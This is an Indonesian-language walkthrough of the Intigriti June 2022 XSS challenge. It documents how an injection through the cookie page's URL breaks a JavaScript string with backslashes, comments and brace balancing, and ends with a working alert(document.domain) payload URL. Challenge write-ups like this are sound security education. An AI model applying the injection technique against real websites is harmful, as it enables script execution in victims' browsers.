# Intigriti June 2022 XSS Challenge
https://challenge-0622.intigriti.io/challenge/index.php


## Dari Alert
Kita mungkin ingin melihat alert, sebelum melihat yang lainnya. Karena serangan XSS sangat relate dengan perintah alert pada JavaScript.  

![](attachments/Pasted%20image%2020220628101540.png)  

Pada page source, bisa dilihat bahwa perintahnya menjadi:
```js
<script>alert(`DOCUMENT.DOMAIN${DOCUMENT.DOMAIN}`)</script>
```

Ternyata setelah beberapa percobaan, alert ini adalah sebuah rabbit hole, karena:
- Semua perintah yang dimasukkan di dalam form ini, akan di upper case oleh server. Akibatnya perintah JavaScript tidak bisa berjalan (perintah JavaScript bersifat case sensitive).
- Terdapat backtick (\`) dan `<script>alert(input)</script>`yang memancing kita untuk menggunakan `${perintah JS}`, namun sekali lagi bahwa semua perintah di sini akan diubah ke upper case.

## Dari Milk
Pada halaman Milk, terdapat perintah `eval(input)` yang bisa menjadi vector untuk serangan JavaScript. Namun sayangnya input form ini hanya menerima data angka.  

![](attachments/Pasted%20image%2020220628132000.png)  

```html
<script>
var total = eval(5.000000+10.000000*4); document.getElementById("total").value=total;
</script>
```

## Dari Cookies
Vektor serangan tidak salah lagi ada pada cookie. Namun untuk bisa memasukkan payload XSS di sini cukup tricky karena tidak ada form input yang terlihat. Kita harus melihat JavaScript yang mengkonstruksi halaman ini.  

![](attachments/Pasted%20image%2020220628104524.png)  

```html
<script>
function cookie_spawn(eggs,chocolate,vendor,location,price){const cookie_value= 'eggs:' + eggs.toString() +', chocolate:'+ chocolate.toString() +', price:10, vendor:'+ vendor.toString() +'; ';document.cookie='cookieshop= '+cookie_value};function create() { cookie_spawn('eggs','chocolate','https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie','/challenge/index.php?choice=cookie',);
};create();
</script>
```

Pretty version (https://beautifier.io/):
```html
<script>
    function cookie_spawn(eggs, chocolate, vendor, location, price) {
        const cookie_value = 'eggs:' + eggs.toString() + ', chocolate:' + chocolate.toString() + ', price:10, vendor:' + vendor.toString() + '; ';
        document.cookie = 'cookieshop= ' + cookie_value
    };

    function create() {
        cookie_spawn('eggs', 'chocolate', 'https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie', '/challenge/index.php?choice=cookie', );
    };
    create();
</script>
```

Mencoba memasukkan input ke dalam URL
```js
/* input: &<img>
url : https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie&%3Cimg%3E 

Hasil input kepada JavaScript */
    function create() {
        cookie_spawn('eggs', 'chocolate', 'https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie263Cimg3E', '/challenge/index.php?choice=cookie263Cimg3E', );
    };
    create();
```

Terlihat bahwa input tersebut di-escape oleh server, sehingga kita tidak bisa secara mudah menjalankan JavaScript. Kita bisa fokuskan pada bagian ini: `'https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie263Cimg3E', '/challenge/index.php?choice=cookie263Cimg3E'`
- Karakter &, <, dan > diubah menjadi 26, 3C dan 3E untuk mencegah serangan XSS.

Kita perlu mengetahui semua karakter yang di-encode dan yang tidak di-encode pada web ini. Untuk hal ini kita bisa gunakan halaman alert.  
![](attachments/Pasted%20image%2020220628134239.png)  

List perubahannya adalah sebagai berikut.
```
<>/?;:'"`{}()[]\|@$^&*~#

3C3E/?;:272260{}()[]\|@$^&*~#
```

Ternyata walaupun semua petik di encode, namun backslash tidak diencode. Coba kita lihat bagaimana serangan ke web tersebut dengan menggunakan semua karakter yang tidak di-encode.

Notes penting untuk serangan ini :
1. Kita bisa injeksikan backslash (\\) untuk mengacaukan string pada JavaScript tersebut.
2. Memainkan comment (//) sebagai escape character agar code hasil injeksi dapat tetap berjalan.
3. Fokuskan pada bagian `'https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie263Cimg3E', '/challenge/index.php?choice=cookie263Cimg3E'` 
4. Terdapat array pada potongan JavaScript tersebut, perubahan pada URL akan mengakibatkan perubahan pada elemen array tersebut.
5. Serangan ini harus bisa dilakukan melalui kolom URL, tidak mengubah isi dari JavaScript melalui console maupun inspector. Namun untuk melakukan testingnya, kita bisa lakukan melalui console.

![](attachments/Pasted%20image%2020220628135842.png)

Jadi step serangannya adalah
1. Masukkan karakter ( \\ ) sebagai escape character untuk tanda petik satu ( ' ) 
```js
function cookie_spawn(eggs,chocolate,vendor,location,price){const cookie_value= 'eggs:' + eggs.toString() +', chocolate:'+ chocolate.toString() +', price:10, vendor:'+ vendor.toString() +'; ';document.cookie='cookieshop= '+cookie_value};function create() { cookie_spawn('eggs','chocolate','https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie26\','/challenge/index.php?choice=cookie\',);
};create();
```
   
2. Script di atas akan menghasilkan` error: invalid escape sequence` masukkan karakter ( // ) sebelum ( \\ )sebagai escape dari array terakhir.
```js
function cookie_spawn(eggs,chocolate,vendor,location,price){const cookie_value= 'eggs:' + eggs.toString() +', chocolate:'+ chocolate.toString() +', price:10, vendor:'+ vendor.toString() +'; ';document.cookie='cookieshop= '+cookie_value};function create() { cookie_spawn('eggs','chocolate','https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie26//\','/challenge/index.php?choice=cookie//\',);
};create();
```

3. Script di atas akan menghasilkan `SyntaxError: missing : in conditional expression`. Silahkan search tentang conditional expression atau ternary expression pada JavaScript, kita bisa gunakan karakter : 1 di akhir sebagai pengganti elemen yang hilang pada ternary expression.
```js
function cookie_spawn(eggs,chocolate,vendor,location,price){const cookie_value= 'eggs:' + eggs.toString() +', chocolate:'+ chocolate.toString() +', price:10, vendor:'+ vendor.toString() +'; ';document.cookie='cookieshop= '+cookie_value};function create() { cookie_spawn('eggs','chocolate','https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie26:1//\','/challenge/index.php?choice=cookie//\:1',);
};create();
```

4. Terdapat `SyntaxError: missing ) after argument list`,  kita bisa fix ini sekaligus dengan menginjeksikan `);alert(document.domain)`. Lakukan pada console untuk mempermudah.
```js
function cookie_spawn(eggs,chocolate,vendor,location,price){const cookie_value= 'eggs:' + eggs.toString() +', chocolate:'+ chocolate.toString() +', price:10, vendor:'+ vendor.toString() +'; ';document.cookie='cookieshop= '+cookie_value};function create() { cookie_spawn('eggs','chocolate','https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie26:1//\','/challenge/index.php?choice=cookie:1);alert(document.domain)//\',);
};create();
```

5. Terdapat `Uncaught ReferenceError: challenge is not defined create debugger eval code:1 <anonymous> debugger eval code:2`, masalahnya adalah challenge ini tidak didefinisikan pada JS. Namun karena variabel tersebut ada pada fungsi `create`, sehingga error tersebut tidak akan muncul apabila `create()` dipanggil atau kita bisa menjalankan `document.domain` sebelum `create()`. Kita tutup saja dengan `}` sebelum `;alert`
```js
function cookie_spawn(eggs,chocolate,vendor,location,price){const cookie_value= 'eggs:' + eggs.toString() +', chocolate:'+ chocolate.toString() +', price:10, vendor:'+ vendor.toString() +'; ';document.cookie='cookieshop= '+cookie_value};function create() { cookie_spawn('eggs','chocolate','https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie26:1//\','/challenge/index.php?choice=cookie:1)};alert(document.domain)//\',);
};create();
```

6. Terdapat `SyntaxError: expected expression, got '}'` akibat adanya karakter ( } ) sebelum create, kita bisa injeksikan `a = {` sebelumnya, jadi final code untuk mendapatkan `document.domain`.
```js
function cookie_spawn(eggs,chocolate,vendor,location,price){const cookie_value= 'eggs:' + eggs.toString() +', chocolate:'+ chocolate.toString() +', price:10, vendor:'+ vendor.toString() +'; ';document.cookie='cookieshop= '+cookie_value};function create() { cookie_spawn('eggs','chocolate','https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie26:1);}alert(document.domain);a={//\','/challenge/index.php?choice=cookie:1);}alert(document.domain);a={//\',);
};create();
```

URL yang digunakan adalah:
```
https://challenge-0622.intigriti.io/challenge/index.php?choice=cookie&:1);}alert(document.domain);a={//\
```


